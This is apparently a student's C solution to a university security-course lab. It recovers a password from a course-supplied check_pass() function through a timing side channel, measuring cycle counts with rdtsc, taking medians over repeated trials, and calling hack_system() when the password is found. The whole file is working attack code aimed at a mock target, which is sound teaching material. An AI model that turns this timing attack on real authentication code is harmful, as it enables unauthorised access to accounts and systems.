/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h> // for median

// include our "system" header
#include "sysapp.h"

// Read cycle counter
// invokes the processors cycle counter (a clock that increments by one for each processor cycle that passes).
// Insert a call to rdtsc() before the call to check_pass() and afterwards.
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

// function for median
int compare (const void * a, const void * b)
{
	  return ( *(unsigned long*)a - *(unsigned long*)b );
}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    // bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    //   care printf
    //   median: One common way to reduce noice is keep redoing the same trials for a certain of time and then take the median of it.
    //   Backtrack (not necessary from Piazza)
    //   big array
    //   character trials: 100 (Piazza)
    //   while loop (Piazza)
    
    // set local variables
    int num_trial = 100; // times of trial
    unsigned long time_diff[100]; // array for recoding each time of single trial
    int max_median; // for median compare
    int last_guess; // for record the last correct guess
    int loop = 1; // for return the correct guess
    int end_check = 0; // for signal if check ends
    
    do{ // use do-while to make sure the output is correct
    // set guess to zero 
    bzero(guess, sizeof(guess));
    // use a loop to go over the whole guess array
    for( int i = 0; i < sizeof(guess)/sizeof(guess[0]); i++ ) {
       
	max_median = 0;
	int k;
       // use another for loop to check from ASCII 33 to ASCII 126
       for ( k = 33; k <= 126; k++ ) {
         
	    guess[i] = k; // set the char to guesss

	 // use another for loop to redo the trail for 100 times
	 for( int j = 0; j < num_trial; j++) {
	   
           // set the start time
	   long s_time = rdtsc();	 
	   // call check_pass()
	   check_pass(guess);
	   // set the end time
	   long e_time = rdtsc();
	   // get the time difference
	   time_diff[j] = e_time - s_time;

         }// trial loop ends

	 // now need to reduce the noise by getting the median from time diff array
	 qsort (time_diff, num_trial, sizeof(unsigned long), compare);
	 int new_median = time_diff[num_trial/2];

	 // compare the new median with old
	 if( new_median > max_median) { // it means the current char may be correct
           max_median = new_median; // update the median value
	   last_guess = k; // set k as the new guess char
         }
       } // ascii loop ends
       
       // update
       guess[i] = last_guess;
       /*
       if( (i == sizeof(guess)/sizeof(guess[0]) - 1) && k == 126 ) // if we have guessed the last char with last ASCII
	       end_check = 1;
       */
       // run final check
       int check_ret = check_pass(guess);
       // if we got the correct password
       if(check_pass(guess)){
           loop = 0;
	   printf("Password Found!\n");
	   hack_system(guess);
        }
       
       /* 
       else{
           bzero(guess, sizeof(guess));
       }
       */
    } // for ends
  } while(loop == 1);
    /*
    if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };
    */
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
